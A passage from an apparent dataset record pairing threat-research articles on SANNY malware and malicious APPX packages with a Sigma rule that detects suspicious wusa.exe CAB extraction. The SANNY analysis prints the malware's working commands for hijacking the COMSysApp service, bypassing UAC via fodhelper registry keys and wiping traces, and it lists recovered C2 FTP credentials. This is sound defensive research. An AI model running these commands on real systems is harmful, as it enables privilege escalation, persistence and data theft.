nul\n     del /f /q %~dp0\\ipnet.ini > nul\n   ```\n\n2. Hijacks a legitimate Windows system service, `COMSysApp` (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious `ipnet.dll` will be loaded when the `COMSysApp` service is started:\n\n   ```image\n   Alt: Service Hijacking Code\n   Description: The image displays a code snippet related to the installation and configuration of a Windows service called `COMSysApp`. It includes commands for stopping the service, configuring it to run with a specific executable path (pointing to `svchost.exe`), and adding registry entries to ensure the malicious `ipnet.dll` is used as the service's dynamic link library (DLL). The commands indicate actions taken to hijack the legitimate service for malicious purposes.\n   Transcription: |\n     :INSTALL\n     sc stop COMSysApp > nul\n     sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" > nul\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f > nul\n     reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\ipnet.dll\" /f > nul\n     sc start COMSysApp > nul\n   ```\n\n3. After the hijacked `COMSysApp` service is started, it will delete all remaining components of the CAB file:\n\n   ```image\n   Alt: Component Deletion Code\n   Description: The image displays a segment of code, specifically command-line instructions related to the deletion of certain files in a Windows environment. It includes commands that use the 'del' function to remove files such as 'NTWDBLIB.dll', 'update.dll', 'dummy.dll', and 'uacme.exe' from the system. The output redirection to 'nul' suggests that any output from these commands will be suppressed, indicating a stealthy approach to file deletion, which is often used in malware operations.\n   Transcription: |\n     del /f /q %~dp0\\NTWDBLIB.dll > nul\n     del /f /q %~dp0\\update.dll > nul\n     del /f /q %~dp0\\dummy.dll > nul\n     del /f /q %~dp0\\uacme.exe > nul\n   ```\n\n`ipnet.dll` is the main component inside the CAB file that is used for performing malicious activities. This DLL exports the following two functions:\n\n1. `ServiceMain` – Invoked when the hijacked system service, `COMSysApp`, is started.\n2. `Post` – Used to perform data exfiltration to the command and control (C2) server using FTP protocol.\n\nThe `ServiceMain` function first performs a check to see if it is being run in the context of `svchost.exe` or `rundll32.exe`. If it is being run in the context of `svchost.exe`, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of `rundll32.exe`, then it performs the following activities:\n\n1. Deletes the module `NTWDBLIB.DLL` from the disk using the following command:\n\n   ```\n   cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n   ```\n\n2. Sets the code page on the system to 65001, which corresponds to UTF-8:\n\n   ```\n   cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n   ```\n\n### Command and Control (C2) Communication\n\nSANNY malware uses the FTP protocol as the C2 communication channel.\n\n#### FTP Config File\n\nThe FTP configuration information used by SANNY malware is encoded and stored inside `ipnet.ini`.\n\nThis file is Base64 encoded using the following custom character set: \n`SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8`\n\nUpon decoding the file, the following credentials can be recovered:\n\n- **FTP Server:** ftp.capnix[.]com\n- **Username:** cnix_21072852\n- **Password:** vlasimir2017\n\nIt then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as `htdocs` using the `FtpSetCurrentDirectoryW` function.\n\n#### System Information Collection\n\nFor reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server.\n\nSystem information is gathered from the machine using the following command:\n\n```image\nAlt: System Information Collection Code\nDescription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\nTranscription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\n```\n\nThe list of running tasks on the system is gathered by executing the following command:\n\n```image\nAlt: Task List Collection Code\nDescription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\nTranscription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\n```\n\n#### C2 Commands\n\nAfter successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the `htdocs` directory. This file will contain C2 commands to be executed by the malware.\n\nUpon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names:\n\n- **chip command:** This command deletes the existing `ipnet.ini` configuration file from the file system and creates a new `ipnet.ini` file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax:\n\n  ```image\n  Alt: Chip Command Code\n  Description: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  Transcription: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  ```\n\n- **pull command:** This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax:\n\n  ```image\n  Alt: Pull Command Code\n  Description: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  Transcription: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  ```\n\n  The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section.\n\n- **put command:** This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax:\n\n  ```image\n  Alt: Put Command Code\n  Description: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  Transcription: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  ```\n\n- **default command:** If the command begins with the substring `cmd /c`, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using `WinExec`.\n\n- **/user command:** This command will execute a command on the system as the logged in user. The command duplicates the access token of `explorer.exe` and spawns a process using the following steps:\n\n  1. Enumerates the running processes on the system to search for the `explorer.exe` process and obtain the process ID of `explorer.exe`.\n  2. Obtains the access token for the `explorer.exe` process with the access flags set to `0x000F01FF`.\n  3. Starts the application (defined in the C2 command) on the system by calling the `CreateProcessAsUser` function and using the access token obtained in Step 2.\n\n| **C2 Command**  | **Purpose**                                         |\n| --------------- | --------------------------------------------------- |\n| chip            | Update the FTP server config file                   |\n| pull            | Upload a file from the machine                      |\n| put             | Copy an existing file to a new destination          |\n| /user           | Create a new process with explorer.exe access token |\n| default command | Execute a program on the machine using WinExec()    |\n\n### Compression and Encoding Data\n\nSANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages `Shell.Application` COM object and calls the `CopyHere` method of the `IShellDispatch` interface to perform compression as follows:\n\n1. Creates an empty ZIP file with the name: `temp.zip` in the `%temp%` directory.\n2. Writes the first 16 bytes of the PK header to the ZIP file.\n3. Calls the `CopyHere` method of `IShellDispatch` interface to compress the collected data and write to `temp.zip`.\n4. Reads the contents of `temp.zip` to memory.\n5. Deletes `temp.zip` from the disk.\n6. Creates an empty file, `post.txt`, in the `%temp%` directory.\n7. The `temp.zip` file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: `%temp%\\post.txt`.\n8. Calls the `FtpPutFileW` function to write the contents of `post.txt` to the remote file with the format: “from <computer_name_timestamp>.txt”\n\n### Execution on Windows 7 and User Account Control (UAC) Bypass\n\n`NTWDBLIB.dll` – This component from the CAB file will be extracted to the `%windir%\\system32` directory. After this, the `cliconfg` command is executed by the BAT file.\n\nThe purpose of this DLL module is to launch the `install.bat` file. The file `cliconfg.exe` is a legitimate Windows binary (SQL Client Configuration Utility), loads the library `NTWDBLIB.dll` upon execution. Placing a malicious copy of `NTWDBLIB.dll` in the same directory as `cliconfg.exe` is a technique known as DLL side-loading, and results in a UAC bypass.\n\n### Execution on Windows 10 and UAC Bypass\n\n`Update.dll` – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses `update.dll` to begin the execution of code instead of invoking the `install.bat` file directly.\n\nThe main actions performed by `update.dll` are as follows:\n\n1. Executes the following commands to setup the Windows registry for UAC bypass:\n\n   ```image\n   Alt: Registry Setup Code\n   Description: The image depicts a series of command line instructions related to Windows registry modifications. It shows three commands that add registry entries to facilitate the execution of a batch file (`install.bat`) within the context of a UAC (User Account Control) bypass for Windows 10. The commands are formatted in a monospaced font and are enclosed in a box, indicating they are part of a technical description in the context of malware delivery methods.\n   Transcription: |\n     plaintext\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d %TEMP%\\install.bat /f\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\n   ```\n\n2. Leverages a UAC bypass technique that uses the legitimate Windows binary, `fodhelper.exe`, to perform the UAC bypass on Windows 10 so that the `install.bat` file is executed with elevated privileges:\n\n   ```image\n   Alt: UAC Bypass Code\n   Description: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   Transcription: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   ```\n\n3. Creates an additional BAT file, `kill.bat`, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components `update.dll` and `kill.bat` from the file system:\n\n   ```image\n   Alt: Kill.bat Code\n   Description: The image displays a code snippet that outlines commands for a batch file, specifically a `kill.bat` script used in malware operations. The commands include `taskkill` to terminate the current process, and `del` commands to forcefully delete the `update.dll` and `kill.bat` files. This code is relevant to the discussion of UAC bypass techniques employed by the SANNY malware on Windows systems.\n   Transcription: |\n     plaintext\n     taskkill /PID <pid_of_current_process> /F\n     del /f /q \"<path>\\update.dll\"\n     del /f /q \"<path>\\kill.bat\"\n   ```\n\n### Conclusion\n\nThis activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions.\n\nUsers can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.\n\n### Indicators of Compromise\n\n| **SHA256 Hash**                                                  | **Original Filename**                                            |\n| ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n| b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 | РГНФ 2018-2019.doc                                               |\n| e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 | Copy of communication from Security Council Committee (1718).doc |\n| eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f | 1.bat                                                            |\n| a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 | Setup.cab (64-bit)                                               |\n| a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 | Setup.cab (32-bit)                                               |",
    "sigma_rule": {
      "title": "Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths",
      "id": "c74c0390-3e20-41fd-a69a-128f0275a5ea",
      "related": [
        {
          "id": "59b39960-5f9d-4a49-9cef-1e4d2c1d0cb9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n",
      "references": [
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://www.echotrail.io/insights/search/wusa.exe/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-11-28",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "Image|endswith": "\\wusa.exe",
          "CommandLine|contains": "/extract:"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\Appdata\\Local\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wusa_cab_files_extraction_from_susp_paths.yml",
    "id": "689"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies 